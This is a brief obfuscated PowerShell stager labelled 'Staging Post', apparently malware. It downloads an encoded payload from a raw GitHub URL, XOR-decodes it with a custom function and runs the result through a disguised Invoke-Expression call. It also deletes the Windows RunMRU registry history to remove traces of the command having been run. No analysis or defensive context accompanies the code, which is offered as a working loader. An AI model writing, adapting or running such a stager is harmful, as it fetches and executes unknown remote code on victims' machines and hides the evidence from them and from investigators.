# ====================== Staging Post =============================

 function cappybara {
    param ([string]$sec,[string]$bty)
    $ajd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($sec))
    $accent = ""
    for ($i = 0; $i -lt $ajd.Length; $i++) {
        $osn = [int]$ajd[$i] -bxor [int]$bty[$i % $bty.Length]
        $accent += [char]$osn
    }
    return $accent
}
$k = "$k"
$mirrage = irm "https://raw.githubusercontent.com/Bongman1234/assets/main/y6rhf4w"
$triphook = cappybara -sec $mirrage -bty $k

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

$triphook | i`ex
